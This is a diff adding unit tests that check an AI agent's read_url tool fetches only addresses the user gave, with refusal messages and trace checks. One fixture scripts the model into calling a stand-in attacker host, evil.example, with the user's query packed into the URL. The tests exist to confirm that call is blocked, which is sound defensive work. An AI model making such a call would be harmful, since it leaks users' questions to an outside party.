@@ -910,5 +910,103 @@ class AskTests(AgentCase):
         self.assertEqual(trace.outcome, "stopped")
 
 
+PAGE = ToolResult(True, "Page “How tides work” (example.org): Tides follow the Moon.", card="url")
+THEIRS = '{"tool": "read_url", "args": {"url": "https://example.org/tides"}}'
+ELSEWHERE = '{"tool": "read_url", "args": {"url": "https://evil.example/?q=what+they+asked"}}'
+WHY = "url must be an address the user gave; got 'https://evil.example/?q=what+they+asked'"
+
+
+class AddressTests(AgentCase):
+    """The model may pass on an address the user gave. It may not fetch one
+    that came from anywhere else, however well formed the call."""
+
+    async def traced(self, message: str, engine: ScriptedEngine, **more):
+        trace = agent.Trace()
+        stream = await collect(agent.run(
+            message, persona=get_persona("agent"), trace=trace, engine=engine,
+            **{"history": [], **more},
+        ))
+        return stream, trace
+
+    async def test_an_address_the_user_did_not_give_is_never_fetched(self) -> None:
+        engine = self.scripted(ELSEWHERE, ELSEWHERE, "I could not open that.")
+        fetched = support.played_tools(self, {"read_url": PAGE})
+        stream, trace = await self.traced("open the page about tides for me", engine)
+        self.assertEqual(fetched["read_url"], [])
+        self.assertEqual(
+            shape(stream),
+            ["step:route:running", "step:route:ok", "step:tool-0:running", "step:tool-0:failed",
+             "card", *ANSWER],
+        )
+        self.assertEqual(support.step(stream, "tool-0", "failed")["detail"], "not allowed")
+        self.assertEqual(
+            only(stream, "card")[0]["data"],
+            {"message": "Read page only goes to an address you gave it yourself."},
+        )
+        self.assertEqual(
+            [(s.kind, s.ok, s.error) for s in trace.steps[:3]],
+            [("route", False, "rejected: " + WHY), ("repair", False, "rejected: " + WHY),
+             ("tool", False, "not allowed")],
+        )
+        # And the model that writes the answer is told it was not opened.
+        self.assertIn(
+            "- read_url: Read page only goes to an address you gave it yourself.",
+            trace.prompt[-1]["content"],
+        )
+
+    async def test_it_is_told_why_once_and_may_choose_again(self) -> None:
+        engine = self.scripted(ELSEWHERE, NONE, "I have no page to read.")
+        fetched = support.played_tools(self, {"read_url": PAGE})
+        stream, _ = await self.traced("open the page about tides for me", engine)
+        self.assertEqual(fetched["read_url"], [])
+        self.assertEqual(
+            engine.passes[1].messages[-1]["content"],
+            f"That call was not made: {WHY}. Reply with one JSON object only.",
+        )
+        self.assertEqual(shape(stream), ["step:route:running", "step:route:ok", *ANSWER])
+
+    async def test_an_address_from_an_earlier_message_of_theirs_is_theirs(self) -> None:
+        engine = self.scripted(THEIRS, "Tides follow the Moon.")
+        fetched = support.played_tools(self, {"read_url": PAGE})
+        history = [{"role": "user", "content": "I was reading example.org/tides earlier"},
+                   {"role": "assistant", "content": "What about it?"}]
+        await self.traced("summarise that page for me", engine, history=history)
+        self.assertEqual(fetched["read_url"], [{"url": "https://example.org/tides"}])
+        self.assertEqual(len(engine.passes), 2)
+
+    async def test_an_address_only_the_model_ever_mentioned_is_not_theirs(self) -> None:
+        engine = self.scripted(THEIRS, THEIRS, "I could not open that.")
+        fetched = support.played_tools(self, {"read_url": PAGE})
+        history = [{"role": "user", "content": "where can I read about tides"},
+                   {"role": "assistant", "content": "Try https://example.org/tides."}]
+        await self.traced("open it", engine, history=history)
+        self.assertEqual(fetched["read_url"], [])
+
+    async def test_a_link_the_user_pasted_is_read_without_asking_the_model_anything(self) -> None:
+        engine = self.scripted("Tides follow the Moon.")
+        fetched = support.played_tools(self, {"read_url": PAGE})
+        stream, _ = await self.traced("https://example.org/tides what does this say", engine)
+        self.assertEqual(fetched["read_url"], [{"url": "https://example.org/tides"}])
+        self.assertEqual(support.step(stream, "route", "ok")["detail"], "heuristic")
+        self.assertEqual(len(engine.passes), 1)
+
+    async def test_a_command_and_a_skill_go_where_the_user_sent_them(self) -> None:
+        for message, how in (("/read https://example.org/tides", {}),
+                             ("https://example.org/tides", {"skill": get_skill("summarise_link")})):
+            with self.subTest(message=message):
+                engine = self.scripted("Tides follow the Moon.")
+                fetched = support.played_tools(self, {"read_url": PAGE})
+                await self.traced(message, engine, **how)
+                self.assertEqual(fetched["read_url"], [{"url": "https://example.org/tides"}])
+
+    async def test_other_tools_that_go_out_are_not_held_to_it(self) -> None:
+        # They go to one fixed service each. What the model gives them is a
+        # thing to look up there, not a place to go.
+        engine = self.scripted(WEATHER, "Take a coat.")
+        asked = support.played_tools(self, {"weather": PARIS})
+        await self.traced("Do I need a coat today", engine)
+        self.assertEqual(asked["weather"], [{"location": "Paris"}])
+
+
 if __name__ == "__main__":
     unittest.main()
